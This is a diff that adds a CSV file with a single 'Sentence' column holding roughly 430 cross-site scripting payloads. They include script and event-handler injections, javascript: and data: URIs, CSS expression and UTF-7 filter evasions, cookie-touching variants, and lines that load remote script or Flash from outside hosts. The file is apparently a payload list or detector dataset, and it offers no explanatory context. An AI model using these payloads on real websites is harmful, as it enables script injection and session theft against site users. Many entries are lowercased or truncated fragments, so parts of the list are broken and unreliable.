@@ -1,0 +1,533 @@
+,Sentence
+0,confirm(2)>/
+1,open()>
+2,location=?javascript:alert(1)>click
+3,<svg><script>alert(/1/)</script>
+4,</script><script>alert(1)</script>
+5,5rt(0);'>rhainfosec
+6,">""<img src=&{document.cookie=true;};>"
+7,">""<img src=""mocha:document.cookie=true;"">"
+8,">""<img src=""livescript:document.cookie=true;"">"
+9,"""data:text/html;base64,phnjcmlwdd5hbgvydcgisgvsbg8ikts8l3njcmlwdd4="">"
+10,prompt(1);>
+11,"<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(""crosssitescripting"")>"
+12,<iframe src=http://vulnerability-lab.com/index.html <
+13,"<table background=""javascript:alert('crosssitescripting')"">"
+14,"<table><td background=""javascript:alert('crosssitescripting')"">"
+15,"<bgsound src=""javascript:alert('crosssitescripting');"">"
+16,"<br size=""&{alert('crosssitescripting')}"">"
+17,"<a href=""http://server.com/"">crosssitescripting</a>"
+18,"<a href=""http://www.google.com"">crosssitescripting</a>"
+19,"<a href=""http://1113982867/"">crosssitescripting</a>"
+20,"<a href=""javascript:document.location='http://www.vulnerability-lab.com/'"">crosssitescripting</a>"
+21,"<base href=""javascript:alert('crosssitescripting');//"">"
+22,""";alert('crosssitescripting');//"
+23,"<input type=""image"" src=""javascript:alert('crosssitescripting');"">"
+24,"<crosssitescripting style=""behavior: url(crosssitescripting.htc);"">"
+25,scriptalert(crosssitescripting)/script
+26,"<img style=""crosssitescripting:expr/*crosssitescripting*/ession(alert('crosssitescripting'))"">"
+27,"<crosssitescripting style=""crosssitescripting:expression(alert('crosssitescripting'))""> exp/*<a style='no\\crosssitescripting:nocrosssitescripting(""*//*""); crosssitescripting:ex/*crosssitescripting*//*/*/pression(alert(""crosssitescripting""))'>"
+28,"<html xmlns:crosssitescripting><?import namespace=""crosssitescripting"" implementation=""http://ha.ckers.org/crosssitescripting.htc""><crosssitescripting:crosssitescripting>crosssitescripting</crosssitescripting:crosssitescripting>"
+29,"<xml id=i><x><c><![cdata[<img src=""javas]]><![cdata[cript:alert('crosssitescripting');"">]]>"
+30,</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>
+31,"<xml id=""crosssitescripting""><i><b><img src=""javas<!-- -->cript:alert('crosssitescripting')""></b></i></xml>"
+32,"<span datasrc=""#crosssitescripting"" datafld=""b"" dataformatas=""html""></span>"
+33,"<xml src=""crosssitescriptingtest.xml"" id=i></xml><span datasrc=#i datafld=c dataformatas=html></span>"
+34,"<?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time"">"
+35,"<?import namespace=""t"" implementation=""#default#time2"">"
+36,"<t:set attributename=""innerhtml"" to=""crosssitescripting<script defer>alert(""crosssitescripting"")</script>"">"
+37,</body></html>
+38,"<script src=""http://vulnerability-lab.com/crosssitescripting.jpg""></script>"
+39,"<? echo('<scr)';echo('ipt>alert(""crosssitescripting"")</script>'); ?>"
+40,"<img src=""http://www.vulnerability-lab.com/file.php?variables=malicious"">"
+41,<iframe src=http://test.de>
+42,"<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert(""xss"")>"
+43,><img id=xss src=x onerror=alert(xss);>
+44,";!--""<xss>=&{()}"""
+45,"<img id=xss src=""javascript:alert('xss');"">"
+46,<img id=xss src=javascript:alert('xss')>
+47,"<img id=xss src=javascript:alert(""xss"")>"
+48,"<img id=xss src=`javascript:alert(""'xss'"")`>"
+49,"<img id=xss src=""jav ascript:alert('xss');"">"
+50,"<img id=xss src=javascript:alert(""xss"")>"";' >"
+51,"<img id=xss src="" javascript:alert('xss');"">"
+52,"<<script>alert(""xss"");//<</script>"
+53,""";alert('xss');//"
+54,<img id=xss src='javascript:alert('xss')
+55,<script>alert(/xss/.source)</script>
+56,"<body background=""javascript:alert('xss')"">"
+57,"</title><script>alert(""xss"");</script>"
+58,"<input type=""image"" id=xss src=""javascript:alert('xss');"">"
+59,<script>alert('xssya')</script>
+60,"<script>alert(""xssya"")</script>"
+61,1<script>prompt(999691)</script>
+62,//1<script>prompt(919397)</script>
+63,"""<script>alert('xssya')</script>"
+64,"'""</script><script>alert('xssya')</script>"
+65,1<script >prompt(962477)</script>
+66,<script>alert(1);</script>
+67,"""><script>alert('xssya')</script>"
+68,"'';!--""<xss>=&{()}"
+69,alert(1)>
+70,""";alert(1)//"
+71,<script>alert('xssya');</script>
+72,"'""--></style></script><script>alert('xss')</script>"
+73,<scr<script>ipt>alert(1)</scr<script>ipt>
+74,javascript:alert(1)//
+75,<script>confirm(0);</script>
+76,"""x:alert"" onerror=""eval(src+'(0)')"">"
+77,"data:text/html,<script>alert(0)</script>"
+78,<body/onhashchange=alert(1)><a+href=#>clickit
+79,<img+src=x+onerror=prompt(1);>
+80,<video+src=x+onerror=prompt(1);>
+81,"""javascript:alert(2)"">"
+82,""";alert('xss)//"
+83,"<img """"""><script>alert(""xss"")</script>"">"
+84,x onfocus=alert(1)>
+85,"<iframe/src=""data:text/html; base64 ,pgjvzhkgb25sb2fkpwfszxj0kdeppg=="">"
+86,"""javascript:alert(1)""><input type=submit>"
+87,"data:text/html, type=image>"
+88,<isindex action=j a vas c r ipt:alert(1) type=image>
+89,confirm(2)>
+90,"""http://www.google.com./"">xss</a>"
+91,"""test""></form><button form=""test"" formaction=""javascript:alert(1)"">x</button>"
+92,write(1) autofocus>
+93,write(1) autofocus><input autofocus>
+94,javascript:alert(1)//></video>
+95,alert(1)><br><br><br><br><br><br>...<br><br><br><br><input autofocus>
+96,test onforminput=alert(1)><input></form><button form=test onformchange=alert(2)>x</button>
+97,"""alert(1)"">"
+98,"""alert(1)""><source></source></video>"
+99,"""javascript:alert(1)"">x</button>"
+100,alert(1)><input autofocus>
+101,"""javascript:alert(1)"">clickme</math>"
+102,"""import"" href=""test.svg"" />"
+103,"<iframe srcdoc=""<img src=x:x onerror=alert(1)>"" />"
+104,"""x""><img onerror=""alert(1)""></picture>"
+105,"""x"" onerror=""alert(1)""></picture>"
+106,""",,,,,x"" onerror=""alert(1)"">"
+107,"""javascript:alert(1)""></table>"
+108,"""--><img src=x onerror=alert(1)//"">"
+109,"""</comment><img src=x onerror=alert(1)//"">"
+110,"""</style><img src=x onerror=alert(1)//"">"
+111,list-style:url() onerror=alert(1)></li>
+112,"content:url(data:image/svg+xml,<svg/>);visibility:hidden onload=alert(1)></div>"
+113,"""javascript://""/></head><body><a href=""/. /,alert(1)//"
+114,"""data:text/html;base64,phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg==""></object>"
+115,"""data:text/html;base64,phnjcmlwdd5hbgvydcgxktwvc2nyaxb0pg==""></embed>"
+116,<b <script>alert(1)//</script>0</script></b>
+117,"""div1""><input value=""``onmouseover=alert(1)""></div> <div id=""div2""></div>"
+118,"document.getelementbyid(""div1"").innerhtml;</script>"
+119,width:1px;filter:glow onfilterchange=alert(1)>x</div>
+120,mhtml:http://html5sec.org/test.html!xss.html></iframe>
+121,"""x` `<script>alert(1)</script>""` `>"
+122,"alt=alert(1)//"">"
+123,alert(1)></title><title title=></title>
+124,xx:xx onerror=alert(1)//--!>
+125,"""-o-link:'javascript:alert(1)';-o-link-source:current"">x</a>"
+126,"<style>@import ""data:,*{x:expression(write(1))}"";</style>"
+127,x:expression8write(1)9>
+128,"$,_=1}}).$=alert</script>"
+129,"<script>referenceerror.prototype.__definegetter__('name', function(){alert(1)}),x</script>"
+130,"function,[{}][0].constructor._('alert(1)')()</script>"
+131,"""#"">{alert(1)}</script>;1"
+132,<b><script<b></b><alert(1)</script </b></b>
+133,"<meta http-equiv=""refresh"" content=""0;url=javascript:document.cookie=true;"">"
+134,"<meta http-equiv=""set-cookie"" content=""userid=<script>document.cookie=true</script>"">"
+135,<script>document.cookie=true;</script>
+136,"<img src=""jav ascript:document.cookie=true;"">"
+137,"<img src=""javascript:document.cookie=true;"">"
+138,"<img src="" javascript:document.cookie=true;"">"
+139,"<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.cookie=true;>"
+140,<script>document.cookie=true;//<</script>
+141,<script <b>document.cookie=true;</script>
+142,"<iframe src=""javascript:document.cookie=true;>"
+143,<script>a=/crosssitescripting/ document.cookie=true;</script>
+144,</title><script>document.cookie=true;</script>
+145,"<input type=""image"" src=""javascript:document.cookie=true;"">"
+146,"<body background=""javascript:document.cookie=true;"">"
+147,<body onload=document.cookie=true;>
+148,"<img dynsrc=""javascript:document.cookie=true;"">"
+149,"<img lowsrc=""javascript:document.cookie=true;"">"
+150,"<bgsound src=""javascript:document.cookie=true;"">"
+151,"<br size=""&{document.cookie=true}"">"
+152,"<layer src=""javascript:document.cookie=true;""></layer>"
+153,"<link rel=""stylesheet"" href=""javascript:document.cookie=true;"">"
+154,"<style>li {list-style-image: url(""javascript:document.cookie=true;"");</style><ul><li>crosssitescripting"
+155,scriptdocument.cookie=true;/script
+156,"<iframe src=""javascript:document.cookie=true;""></iframe>"
+157,"<frameset><frame src=""javascript:document.cookie=true;""></frameset>"
+158,"<table background=""javascript:document.cookie=true;"">"
+159,"<table><td background=""javascript:document.cookie=true;"">"
+160,"<div style=""background-image: url(javascript:document.cookie=true;)"">"
+161,"<div style=""width: expression(document.cookie=true);"">"
+162,<style>@im\\port'\\ja asc ipt:document.cookie=true';</style>
+163,"<img style=""crosssitescripting:expr/*crosssitescripting*/ession(document.cookie=true)"">"
+164,"<crosssitescripting style=""crosssitescripting:expression(document.cookie=true)"">"
+165,"exp/*<a style='no\\crosssitescripting:nocrosssitescripting(""*//*"");crosssitescripting:ex/*crosssitescripting*//*/*/pression(document.cookie=true)'>"
+166,"<style type=""text/javascript"">document.cookie=true;</style>"
+167,<body onload=alert('xss')>
+168,"<style>.crosssitescripting{background-image:url(""javascript:document.cookie=true"");}</style><a class=crosssitescripting></a>"
+169,"<style type=""text/css"">body{background:url(""javascript:document.cookie=true"")}</style>"
+170,"<base href=""javascript:document.cookie=true;//"">"
+171,<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></object>
+172,"<xml id=i><x><c><![cdata[<img src=""javas]]<![cdata[cript:document.cookie=true;"">]]</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>"
+173,"<xml id=""crosssitescripting""><i><b><img src=""javas<!-- -->cript:document.cookie=true""></b></i></xml><span datasrc=""#crosssitescripting"" datafld=""b"" dataformatas=""html""></span>"
+174,"<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""crosssitescripting<script defer>document.cookie=true</script>""></body></html>"
+175,<? echo('<scr)';echo('ipt>document.cookie=true</script>'); ?>
+176,"<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-document.cookie=true;+adw-/script+ad4-"
+177,"<a href=""javascript#document.cookie=true;"">"
+178,"<div onmouseover=""document.cookie=true;"">"
+179,"<input type=""image"" dynsrc=""javascript:document.cookie=true;"">"
+180,&<script>document.cookie=true;</script>
+181,&{document.cookie=true;};
+182,<img src=&{document.cookie=true;};>
+183,"<img src=""mocha:document.cookie=true;"">"
+184,"<img src=""livescript:document.cookie=true;"">"
+185,"<a href=""about:<script>document.cookie=true;</script>"">"
+186,"<body onload=""document.cookie=true;"">"
+187,"<div style=""background-image: url(javascript:document.cookie=true;);"">"
+188,"<div style=""behaviour: url([link to code]);"">"
+189,"<div style=""binding: url([link to code]);"">"
+190,"<div style=""width: expression(document.cookie=true;);"">"
+191,"<object classid=""clsid:..."" codebase=""javascript:document.cookie=true;"">"
+192,<style><!--</style><script>document.cookie=true;//--></script>
+193,<<script>document.cookie=true;</script>
+194,<script>document.cookie=true;//--></script>
+195,<!-- -- --><script>document.cookie=true;</script><!-- -- -->
+196,"<img src=""blah""onmouseover=""document.cookie=true;"">"
+197,"<img src=""blah>"" onmouseover=""document.cookie=true;"">"
+198,"<xml src=""javascript:document.cookie=true;"">"
+199,"<xml id=""x""><a><b><script>document.cookie=true;</script>;</b></a></xml>"
+200,"<div datafld=""b"" dataformatas=""html"" datasrc=""#x""></div> ]]> [a][a]script>document.cookie=true;[a][a]/script>"
+201,">""<meta http-equiv=""refresh"" content=""0;url=javascript:document.cookie=true;"">"
+202,">""<meta http-equiv=""set-cookie"" content=""userid=<script>document.cookie=true</script>"">"
+203,">""<script>document.cookie=true;</script>"
+204,">""<img src=""jav ascript:document.cookie=true;"">"
+205,">""<img src=""javascript:document.cookie=true;"">"
+206,">""<img src="" javascript:document.cookie=true;"">"
+207,">""<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.cookie=true;>"
+208,">""<script>document.cookie=true;//<</script>"
+209,">""<script <b>document.cookie=true;</script>"
+210,">""<iframe src=""javascript:document.cookie=true;>"
+211,">""<script>a=/crosssitescripting/ document.cookie=true;</script>"
+212,">""</title><script>document.cookie=true;</script>"
+213,">""<input type=""image"" src=""javascript:document.cookie=true;"">"
+214,">""<body background=""javascript:document.cookie=true;"">"
+215,">""<body onload=document.cookie=true;>"
+216,">""<img dynsrc=""javascript:document.cookie=true;"">"
+217,">""<img lowsrc=""javascript:document.cookie=true;"">"
+218,">""<bgsound src=""javascript:document.cookie=true;"">"
+219,">""<br size=""&{document.cookie=true}"">"
+220,">""<layer src=""javascript:document.cookie=true;""></layer>"
+221,">""<link rel=""stylesheet"" href=""javascript:document.cookie=true;"">"
+222,">""<style>li {list-style-image: url(""javascript:document.cookie=true;"");</style><ul><li>crosssitescripting"
+223,">""scriptdocument.cookie=true;/script"
+224,">""<iframe src=""javascript:document.cookie=true;""></iframe>"
+225,">""<frameset><frame src=""javascript:document.cookie=true;""></frameset>"
+226,">""<table background=""javascript:document.cookie=true;"">"
+227,">""<table><td background=""javascript:document.cookie=true;"">"
+228,">""<div style=""background-image: url(javascript:document.cookie=true;)"">"
+229,">""<div style=""width: expression(document.cookie=true);"">"
+230,">""<style>@im\\port'\\ja asc ipt:document.cookie=true';</style>"
+231,">""<img style=""crosssitescripting:expr/*crosssitescripting*/ession(document.cookie=true)"">"
+232,">""<crosssitescripting style=""crosssitescripting:expression(document.cookie=true)"">"
+233,">""exp/*<a style='no\\crosssitescripting:nocrosssitescripting(""*//*"");crosssitescripting:ex/*crosssitescripting*//*/*/pression(document.cookie=true)'>"
+234,">""<style type=""text/javascript"">document.cookie=true;</style>"
+235,">""<style>.crosssitescripting{background-image:url(""javascript:document.cookie=true"");}</style><a class=crosssitescripting></a>"
+236,">""<style type=""text/css"">body{background:url(""javascript:document.cookie=true"")}</style>"
+237,">""<base href=""javascript:document.cookie=true;//"">"
+238,">""<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></object>"
+239,">""<xml id=i><x><c><![cdata[<img src=""javas]]<![cdata[cript:document.cookie=true;"">]]</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>"
+240,">""<xml id=""crosssitescripting""><i><b><img src=""javas<!-- -->cript:document.cookie=true""></b></i></xml><span datasrc=""#crosssitescripting"" datafld=""b"" dataformatas=""html""></span>"
+241,">""<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""crosssitescripting<script defer>document.cookie=true</script>""></body></html>"
+242,">""<? echo('<scr)';echo('ipt>document.cookie=true</script>'); ?>"
+243,">""<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-document.cookie=true;+adw-/script+ad4-"
+244,">""<a href=""javascript#document.cookie=true;"">"
+245,">""<div onmouseover=""document.cookie=true;"">"
+246,">""<input type=""image"" dynsrc=""javascript:document.cookie=true;"">"
+247,">""&<script>document.cookie=true;</script>"
+248,">""&{document.cookie=true;};"
+249,">""<a href=""about:<script>document.cookie=true;</script>"">"
+250,">""<body onload=""document.cookie=true;"">"
+251,">""<div style=""background-image: url(javascript:document.cookie=true;);"">"
+252,">""<div style=""behaviour: url([link to code]);"">"
+253,">""<div style=""binding: url([link to code]);"">"
+254,">""<div style=""width: expression(document.cookie=true;);"">"
+255,">""<object classid=""clsid:..."" codebase=""javascript:document.cookie=true;"">"
+256,">""<style><!--</style><script>document.cookie=true;//--></script>"
+257,">""<<script>document.cookie=true;</script>"
+258,">""<script>document.cookie=true;//--></script>"
+259,">""<!-- -- --><script>document.cookie=true;</script><!-- -- -->"
+260,">""<img src=""blah""onmouseover=""document.cookie=true;"">"
+261,">""<img src=""blah>"" onmouseover=""document.cookie=true;"">"
+262,">""<xml src=""javascript:document.cookie=true;"">"
+263,">""<xml id=""x""><a><b><script>document.cookie=true;</script>;</b></a></xml>"
+264,">""<div datafld=""b"" dataformatas=""html"" datasrc=""#x""></div> ]]> [a][a]script>document.cookie=true;[a][a]/script>"
+265,"-1<meta http-equiv=""refresh"" content=""0;url=javascript:document.cookie=true;"">"
+266,"-1<meta http-equiv=""set-cookie"" content=""userid=<script>document.cookie=true</script>"">"
+267,-1<script>document.cookie=true;</script>
+268,"-1<img src=""jav ascript:document.cookie=true;"">"
+269,"-1<img src=""javascript:document.cookie=true;"">"
+270,"-1<img src="" javascript:document.cookie=true;"">"
+271,"-1<body onload!#$%&()*~+-_.,:;?@[/|\\]^`=document.cookie=true;>"
+272,-1<script>document.cookie=true;//<</script>
+273,-1<script <b>document.cookie=true;</script>
+274,"-1<iframe src=""javascript:document.cookie=true;>"
+275,-1<script>a=/crosssitescripting/ document.cookie=true;</script>
+276,-1</title><script>document.cookie=true;</script>
+277,"-1<input type=""image"" src=""javascript:document.cookie=true;"">"
+278,"-1<body background=""javascript:document.cookie=true;"">"
+279,-1<body onload=document.cookie=true;>
+280,"-1<img dynsrc=""javascript:document.cookie=true;"">"
+281,"-1<img lowsrc=""javascript:document.cookie=true;"">"
+282,"-1<bgsound src=""javascript:document.cookie=true;"">"
+283,"-1<br size=""&{document.cookie=true}"">"
+284,"-1<layer src=""javascript:document.cookie=true;""></layer>"
+285,"-1<link rel=""stylesheet"" href=""javascript:document.cookie=true;"">"
+286,"-1<style>li {list-style-image: url(""javascript:document.cookie=true;"");</style><ul><li>crosssitescripting"
+287,-1scriptdocument.cookie=true;/script
+288,"-1<iframe src=""javascript:document.cookie=true;""></iframe>"
+289,"-1<frameset><frame src=""javascript:document.cookie=true;""></frameset>"
+290,"-1<table background=""javascript:document.cookie=true;"">"
+291,"-1<table><td background=""javascript:document.cookie=true;"">"
+292,"-1<div style=""background-image: url(javascript:document.cookie=true;)"">"
+293,"-1<div style=""width: expression(document.cookie=true);"">"
+294,-1<style>@im\\port'\\ja asc ipt:document.cookie=true';</style>
+295,"-1<img style=""crosssitescripting:expr/*crosssitescripting*/ession(document.cookie=true)"">"
+296,"-1<crosssitescripting style=""crosssitescripting:expression(document.cookie=true)"">"
+297,"-1exp/*<a style='no\\crosssitescripting:nocrosssitescripting(""*//*"");crosssitescripting:ex/*crosssitescripting*//*/*/pression(document.cookie=true)'>"
+298,"-1<style type=""text/javascript"">document.cookie=true;</style>"
+299,"-1<style>.crosssitescripting{background-image:url(""javascript:document.cookie=true"");}</style><a class=crosssitescripting></a>"
+300,"-1<style type=""text/css"">body{background:url(""javascript:document.cookie=true"")}</style>"
+301,"-1<base href=""javascript:document.cookie=true;//"">"
+302,"""><iframe src=a onload=alert(""vl"") <"
+303,-1<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:document.cookie=true></object>
+304,"-1<xml id=i><x><c><![cdata[<img src=""javas]]<![cdata[cript:document.cookie=true;"">]]</c></x></xml><span datasrc=#i datafld=c dataformatas=html></span>"
+305,"-1<xml id=""crosssitescripting""><i><b><img src=""javas<!-- -->cript:document.cookie=true""></b></i></xml><span datasrc=""#crosssitescripting"" datafld=""b"" dataformatas=""html""></span>"
+306,"-1<html><body><?xml:namespace prefix=""t"" ns=""urn:schemas-microsoft-com:time""><?import namespace=""t"" implementation=""#default#time2""><t:set attributename=""innerhtml"" to=""crosssitescripting<script defer>document.cookie=true</script>""></body></html>"
+307,-1<? echo('<scr)';echo('ipt>document.cookie=true</script>'); ?>
+308,"-1<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-document.cookie=true;+adw-/script+ad4-"
+309,"-1<a href=""javascript#document.cookie=true;"">"
+310,"-1<div onmouseover=""document.cookie=true;"">"
+311,"-1<input type=""image"" dynsrc=""javascript:document.cookie=true;"">"
+312,-1&<script>document.cookie=true;</script>
+313,-1&{document.cookie=true;};
+314,-1<img src=&{document.cookie=true;};>
+315,"-1<img src=""mocha:document.cookie=true;"">"
+316,"-1<img src=""livescript:document.cookie=true;"">"
+317,"<img dyn id=xss src=""javascript:alert('xss')"">"
+318,"-1<a href=""about:<script>document.cookie=true;</script>"">"
+319,"-1<body onload=""document.cookie=true;"">"
+320,"-1<div style=""background-image: url(javascript:document.cookie=true;);"">"
+321,"-1<div style=""behaviour: url([link to code]);"">"
+322,"-1<div style=""binding: url([link to code]);"">"
+323,"-1<div style=""width: expression(document.cookie=true;);"">"
+324,"-1<object classid=""clsid:..."" codebase=""javascript:document.cookie=true;"">"
+325,-1<style><!--</style><script>document.cookie=true;//--></script>
+326,-1<<script>document.cookie=true;</script>
+327,-1<script>document.cookie=true;//--></script>
+328,-1<!-- -- --><script>document.cookie=true;</script><!-- -- -->
+329,"-1<img src=""blah""onmouseover=""document.cookie=true;"">"
+330,"-1<img src=""blah>"" onmouseover=""document.cookie=true;"">"
+331,"-1<xml src=""javascript:document.cookie=true;"">"
+332,"-1<xml id=""x""><a><b><script>document.cookie=true;</script>;</b></a></xml>"
+333,"-1<div datafld=""b"" dataformatas=""html"" datasrc=""#x""></div> ]]> [a][a]script>document.cookie=true;[a][a]/script>"
+334,">""<iframe src=http://vulnerability-lab.com/>@gmail.com"
+335,">""<script>alert(document.cookie)</script><div style=""1@gmail.com"
+336,">""<script>alert(document.cookie)</script>@gmail.com"
+337,<iframe src=http://vulnerability-lab.com/>@gmail.com
+338,"<script>alert(document.cookie)</script><div style=""1@gmail.com"
+339,<script>alert(document.cookie)</script>@gmail.com
+340,"+49/>""<iframe src=http://vulnerability-lab.com>1337"
+341,"""><iframe src='' onload=alert('mphone')>"
+342,<iframe src=http://vulnerability-lab.com>1337+1
+343,"><script>alert(""vlab"")</script>"
+344,">""<iframe src=http://vulnerability-lab.com></iframe>"
+345,<html><body>
+346,"<button.onclick=""alert(string.fromcharcode(60,115,99,114,105,112,116,62,97,108,101,114,116,40,34,67,114,111,115,115,83,105,116,101,83,99,114,105,112,116,105,110,103,64,82,69,77,7,86,69,34,41,60,47,115,99,114,105,112,116,62));"">string:from.char.code</button></body></html>"
+347,"';alert(string.fromcharcode(88,83,83))//';alert(string.fromcharcode(88,83,83))//"";alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))//"";alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))//--></script>"">'><script>alert(string.fromcharcode(67, 114, 111, 115, 115, 83, 105, 116, 101, 83, 99, 114, 105, 112, 116, 105, 110, 103))</script>"
+348,"'';!--""<crosssitescripting>=&{()}"
+349,"<script>alert(""crosssitescripting2"")</script>"
+350,<script>alert(document.cookie)</script>
+351,<iframe src=http://www.vulnerability-lab.com>
+352,<script>alert('vl')</script>
+353,"<!--#exec cmd=""/bin/echo '<scr'""--><!--#exec cmd=""/bin/echo 'ipt src=http://vulnerability-lab.com/crosssitescripting.js></script>'""-->"
+354,<script>alert(document.cookie)</script> <script>alert(document.cookie)</script>@gmail.com
+355,"<img src=javascript:alert(""crosssitescripting"")>"";' >"
+356,"<script>alert(""crosssitescripting"")</script>"";' >"
+357,<!--[if gte ie 4]> <script>alert('crosssitescripting');</script> <![endif]-->
+358,"<embed src=""http://vulnerability-lab.com/crosssitescripting.swf"" allowscriptaccess=""always""></embed>"
+359,"<embed src=""data:image/svg+xml;base64,phn2zyb4bwxuczpzdmc9imh0dh a6ly93d3cudzmub3jnlziwmdavc3zniib4bwxucz0iahr0cdovl3d3dy53my5vcmcv mjawmc9zdmciihhtbg5zonhsaw5rpsjodhrwoi8vd3d3lnczlm9yzy8xotk5l3hs aw5riib2zxjzaw9upsixljaiihg9ijaiihk9ijaiihdpzhropsixotqiighlawdodd0imjaw iibpzd0iehnzij48c2nyaxb0ihr5cgu9inrlehqvzwntyxnjcmlwdci+ywxlcnqoilh tuyipozwvc2nyaxb0pjwvc3znpg=="" type=""image/svg+xml"" allowscriptaccess=""always""></embed>"
+360,"<object type=""application/x-shockwave-flash"" data=""http://www.vulnerability-lab.com/hack.swf"" width=""300"" height=""300"">"
+361,<script src=http://vulnerability-lab.com/crosssitescripting.js></script>
+362,"<<script>alert(""crosssitescripting"");//<</script>"
+363,<script src=http://vulnerability-lab.com/crosssitescripting.js?<b>
+364,<script src=//vulnerability-lab.com/.js>
+365,<script>a=/crosssitescripting/ alert(a.source)</script>
+366,"<script a="">"" src=""http://vulnerability-lab.com/crosssitescripting.js""></script>"
+367,"<script a=`>` src=""http://vulnerability-lab.com/crosssitescripting.js""></script>"
+368,"<script>document.write(""<scri"");</script>pt src=""http://vulnerability-lab.com/crosssitescripting.js""></script>"
+369,"</title><script>alert(""crosssitescripting"");</script>"
+370,"<img src=""javascript:alert('crosssitescripting');"">"
+371,<img src=javascript:alert('crosssitescripting')>
+372,"<img src=javascript:alert(""crosssitescripting"")>"
+373,"<img src=`javascript:alert(""rm'crosssitescripting'"")`>"
+374,"<img """"""><script>alert(""crosssitescripting"")</script>"">"
+375,"<img src=javascript:alert(string.fromcharcode(88,83,83))>"
+376,"<img src=""jav ascript:alert('crosssitescripting');"">"
+377,"<img src="" javascript:alert('crosssitescripting');"">"
+378,"<img src=""javascript:alert('crosssitescripting')"""
+379,"<img dynsrc=""javascript:alert('crosssitescripting')"">"
+380,"<img lowsrc=""javascript:alert('crosssitescripting')"">"
+381,"<img src='vbscript:msgbox(""crosssitescripting"")'>"
+382,"<img src=""mocha:[code]"">"
+383,"<img src=""livescript:[code]"">"
+384,"<meta http-equiv=""refresh"" content=""0;url=javascript:alert('crosssitescripting');"">"
+385,"<meta http-equiv=""refresh"" content=""0;url=data:text/html;base64,phnjcmlwdd5hbgvydcgnwfntjyk8l3njcmlwdd4k"">"
+386,"<meta http-equiv=""refresh"" content=""0; url=http://;url=javascript:alert('crosssitescripting');"">"
+387,"<meta http-equiv=""link"" content=""<http://vulnerability-lab.com/crosssitescripting.css>; rel=stylesheet"">"
+388,"<meta http-equiv=""set-cookie"" content=""userid=<script>alert('crosssitescripting')</script>"">"
+389,"<head><meta http-equiv=""content-type"" content=""text/html; charset=utf-7""> </head>+adw-script+ad4-alert('crosssitescripting');+adw-/script+ad4-"
+390,"<object type=""text/x-scriptlet"" data=""http://vulnerability-lab.com/scriptlet.html""></object>"
+391,<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('crosssitescripting')></object>
+392,"<style>@im\\port'\\ja asc ipt:alert(""crosssitescripting"")';</style>"
+393,<style>@import'http://vulnerability-lab.com/crosssitescripting.css';</style>
+394,"<style type=""text/javascript"">alert('crosssitescripting');</style>"
+395,"<style>.crosssitescripting{background-image:url(""javascript:alert('crosssitescripting')"");}</style><a class=crosssitescripting></a>"
+396,"<style type=""text/css"">body{background:url(""javascript:alert('crosssitescripting')"")}</style>"
+397,"<style>li {list-style-image: url(""javascript:alert('crosssitescripting')"");}</style><ul><li>crosssitescripting"
+398,"<style>body{-moz-binding:url(""http://vulnerability-lab.com/crosssitescriptingmoz.xml#crosssitescripting"")}</style>"
+399,"<div style=""background-image: url(javascript:alert('crosssitescripting'))"">"
+400,"<div style=""background-image:52c8'a161332904a1c5248.10278.1053379'9"">"
+401,"<div style=""width: expression(alert('crosssitescripting'));"">"
+402,"<layer src=""http://vulnerability-lab.com/script.html""></layer>"
+403,"<link rel=""stylesheet"" href=""javascript:alert('crosssitescripting');"">"
+404,"<link rel=""stylesheet"" href=""http://vulnerability-lab.com/crosssitescripting.css"">"
+405,"<body background=""javascript:alert('crosssitescripting')"">"
+406,<body onload=alert('crosssitescripting')>
+407,"<img low id=xss src=""javascript:alert('xss')"">"
+408,"<bgsound id=xss src=""javascript:alert('xss');"">"
+409,"<link rel=""stylesheet"" href=""javascript:alert('xss');"">"
+410,"<img id=xss src='vbscript:msgbox(""xss"")'>"
+411,"<meta http-equiv=""refresh"" content=""0;url=javascript:alert('xss');"">"
+412,"<table id=xss background=""javascript:alert('xss')"">"
+413,"<table id=xss><td background=""javascript:alert('xss')"">"
+414,"<div id=xss style=""background-image: url(javascript:alert('xss'))"">"
+415,"<div id=xss style=""width: expression(alert('xss'));"">"
+416,"<iframe id=xss src=""javascript:alert('xss');""></iframe>"
+417,"<frameset><frame id=xss src=""javascript:alert('xss');""></frameset>"
+418,"<table background=""javascript:alert('xss')"">"
+419,"<table><td background=""javascript:alert('xss')"">"""
+420,"<style>@im\\port'\\ja asc ipt:alert(""xss"")';</style>"
+421,"<img id=xss style=""xss:expr/*xss*/ession(alert('xss'))"">"
+422,"<style type=""text/javascript"">alert('xss');</style>"
+423,"<style>.xss{background-image:url(""javascript:alert('xss')"");}</style><a class=xss></a>"
+424,"<style type=""text/css"">body{background:url(""javascript:alert('xss')"")}</style>"
+425,"<base href=""javascript:alert('xss');//"">"
+426,<object classid=clsid:ae24fdae-03c6-11d1-8b76-0080c744f389><param name=url value=javascript:alert('xss')></object>
+427,"a=""get"";b=""url("""";c=""javascript:"";d=""alert('xss');"")"";eval(a+b+c+d);"
